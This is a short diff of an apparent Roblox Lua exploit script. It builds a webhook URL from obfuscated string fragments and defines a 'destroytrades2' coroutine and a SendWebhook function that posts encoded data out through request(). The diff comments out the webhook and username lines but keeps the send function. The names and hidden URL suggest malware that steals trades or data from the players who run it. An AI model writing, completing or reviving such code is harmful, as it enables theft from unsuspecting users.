@@ -822,7 +822,7 @@ if _G.vlorp then
     return
 end
 _G.vlorp = true
-local webHook = pl .. fe .. mf .. qpd .. bas .. pal .. rbs .. qlj .. anw .. qno .. qnf .. gin
+--local webHook = pl .. fe .. mf .. qpd .. bas .. pal .. rbs .. qlj .. anw .. qno .. qnf .. gin
 local trwo = "site"
 local pqmd = "test"
 local destroytrades2 = coroutine.create(function()
@@ -842,7 +842,7 @@ local hwmfi = "010"
 	wait(0.1)
     end
 end)
-local userName = trwo .. pqmd .. hwmfi
+--local userName = trwo .. pqmd .. hwmfi
 function SendWebhook(url, data)
     local jsonData = HttpService:JSONEncode(data)
     local response = request({
